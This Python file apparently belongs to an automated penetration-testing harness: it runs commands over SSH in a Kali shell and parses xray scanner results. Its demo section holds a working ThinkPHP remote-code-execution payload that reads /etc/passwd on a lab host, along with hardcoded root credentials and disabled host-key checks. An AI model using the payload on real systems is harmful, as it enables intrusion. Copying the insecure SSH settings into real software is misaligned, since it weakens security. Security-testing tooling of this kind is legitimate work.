import paramiko
import time
import re
from termcolor import colored
class InteractiveShell:
    # change hostname,port
    # add initial_path
    # add HOST_IDENTIFIER
    HOST_IDENTIFIER = "root@node-003"
    def __init__(self, hostname='192.168.34.103', port=2222, username='root', password='123456', timeout=30, initial_path='/usr/local/bin'):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(hostname, username=username, password=password, port=port)
        self.session = self.client.invoke_shell()
        self.timeout = timeout
        # self.execute_command("pwd") #del
        self.execute_command("cd " + initial_path) #add
        

    def execute_command(self, command:str):
        """
        Execute a command in a interactive kali docker shell on the local machine.
        Initially, we are in the /root/ directory.

        @param cmd: The command to execute.
        """
        if self.session is None:
            raise Exception("No session available.")

        # 将command中的反斜杠替换为双反斜杠
        # command = repr(command)

        # clean the command
        command = command.strip()
        if command.startswith("`") and command.endswith("`"):
            command = command[1:-1]
        if command.count('\n') > 0:
            command = command.splitlines()
            command = ''.join(command[1:-1])
        if 'curl' in command:
            # 清理URL，去除<url>标签和转义字符
            command = re.sub(r'<url>', '', command)
            command = command.replace('\\r', '').replace('\\n', '')

            # 检查命令是否以 " 结尾，如果没有则添加
            if command.count('"') % 2 != 0:
                command += '"'
            print(colored("执行的curl命令是", 'red'), colored(command, 'red'))
        if 'wget' in command:
            print(colored("执行的wget命令是", 'red'), colored(command, 'red'))
        if 'nano ' in command:
            return "nano is not supported in this environment"
            command = "echo 'nano is not supported in this environment'"
        if 'searchsploit ' in command:
            return "searchsploit is not supported in this environment"
            command = "echo 'searchsploit is not supported in this environment'"
        if 'man ' in command:
            return "man is not supported in this environment"


        if "xray" in command:
            if '--poc' in command:
                parts = command.split()
                new_parts = []
                skip_next = False
                for part in parts:
                    if skip_next:
                        skip_next = False
                        continue
                    if part == '--poc':
                        skip_next = True
                    else:
                        new_parts.append(part)
                command = ' '.join(new_parts)
            # command += " --poc ~/poc_info/pocs/*"

        self.session.send(command + '\n')

        start_time = time.time()
        output = ""
        while True:
            if time.time() - start_time > self.timeout: # execution timeout
                self.session.send('\x03')
                while self.HOST_IDENTIFIER not in output: #change
                    if time.time() - start_time > self.timeout * 2:
                        raise Exception(f"Command timeout and cannot be stopped, cmd={command}")
                    output += self.session.recv(1024).decode('utf-8')
                output += "\nCommand execution timeout!"
                return self.omit(command, output)
            
            if self.HOST_IDENTIFIER in output: # change
                return self.omit(command, output)
            # read outputs
            if self.session.recv_ready():
                while self.session.recv_ready():
                    output += self.session.recv(1024).decode('utf-8','ignore')
                time.sleep(0.5)  # add a delay after receiving output
            else:
                time.sleep(0.5)
        

    def omit(self, command, output)->str:
        '''
        omit the command from the output for special commands
        '''
        if "make" in command:
            return "\n".join(output.split("\n")[-30:])
        elif "configure" in command:
            return "\n".join(output.split("\n")[-20:])
        elif "cmake" in command:
            return "\n".join(output.split("\n")[-20:])
        else:
            return output

    def close(self):
        if self.client:
            self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()

import re

def parse_vuln(text):
    vulns = []
    color_codes = r'\x1b\[([0-?]*[ -/]*[@-~])'
    raw_text = re.sub(color_codes, '', text)
    lines = raw_text.splitlines()
    # lines = text.splitlines()
    vuln_info = None
    for line in lines:
        if line.startswith('[Vuln: '):
            vuln_info = {}
            vuln_match = re.search(r'\[Vuln: (.*?)\]', line)
            if vuln_match:
                vuln_info['vuln'] = vuln_match.group(1)
        elif vuln_info:
            match = re.search(r'(\w+)\s+"(.*?)"', line)
            if match:
                vuln_info[match.group(1).lower()] = match.group(2)
            elif line.startswith('Payload'):
                match = re.search(r'Payload\s+"(.*?)"', line)
                if match:
                    vuln_info['payload'] = match.group(1)
            elif line.startswith('Links'):
                match = re.search(r'Links\s+\[(.*?)\]', line)
                if match:
                    links = match.group(1).split(', ')
                    vuln_info['links'] = [link.strip('"') for link in links]
            elif line.startswith('level'):
                match = re.search(r'level\s+"(.*?)"\s*', line)
                if match:
                    vuln_info['level'] = match.group(1)
            elif 'target' in vuln_info and 'vulntype' in vuln_info and 'vuln' in vuln_info:
                vulns.append(vuln_info)
                vuln_info = None
    return vulns

if __name__ == '__main__':
    # DEMO
    with InteractiveShell() as shell:
        print("="*60)
        print(shell.execute_command("pwd"))
        #步骤一：查看phpinfo
        wget_res = shell.execute_command(r"wget -O - 'http://192.168.34.103:8081/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'")
        print(wget_res)
        print("="*60)
        #步骤二
        wget_res = shell.execute_command(r" wget -O - 'http://192.168.34.103:8081/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd'")
        print(wget_res)
        print("="*60)
        # scan_res = shell.execute_command('xray ws --url 192.168.160.1:8081')
        scan_res = shell.execute_command('xray ws --url 192.168.34.103:8081')
        print(scan_res)
        # color_codes = r'\x1b\[([0-?]*[ -/]*[@-~])'
        # scan_res = re.sub(color_codes, '', scan_res)
        vuln_dict = parse_vuln(scan_res)

        print(vuln_dict)
        result = [item for item in vuln_dict if 'level' in item]

        print(result)

